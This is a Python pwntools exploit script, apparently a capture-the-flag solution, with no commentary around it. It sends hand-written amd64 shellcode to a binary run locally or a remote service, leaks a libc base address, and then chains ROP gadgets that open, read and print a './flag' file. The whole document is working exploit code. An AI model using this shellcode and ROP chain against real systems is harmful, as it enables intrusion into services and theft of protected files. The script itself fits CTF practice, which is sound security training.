from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6"
ld_path = "/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    # io = process(vuln_path)
    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("43.137.11.211", 7724)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


shellcode = asm('''movq rsp,xmm2
xor rax,rax
push rax
push rax
push rsp
pop rsi
pop rdi
pop rax
syscall
ret
''')
print(len(shellcode))

ddebug()
io.sendafter(' limited bytes!\n', shellcode)
push_rsp = 0x202300a
pop_rsi = 0x202300b
pop_rdi = 0x202300c

rop = p64(0) * 2 + p64(pop_rdi) + p64(1) + p64(1) # write
rop += p64(push_rsp) + p64(0) + p64(0) # read

io.send(rop)

libcbase = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) + 0x2b60
success("libcaddress -> " + hex(libcbase))

pay = b'./flag\x00\x00' + p64(0)
pay += p64(pop_rsi) + p64(0) + p64(libcbase + 0x1744) + p64(2) # open
pay += p64(pop_rsi) + p64(libcbase + 0x1804) + p64(3) + p64(0) # read
pay += p64(pop_rsi) + p64(libcbase + 0x1804) + p64(1) + p64(1) # write

io.send(pay)

io.interactive()
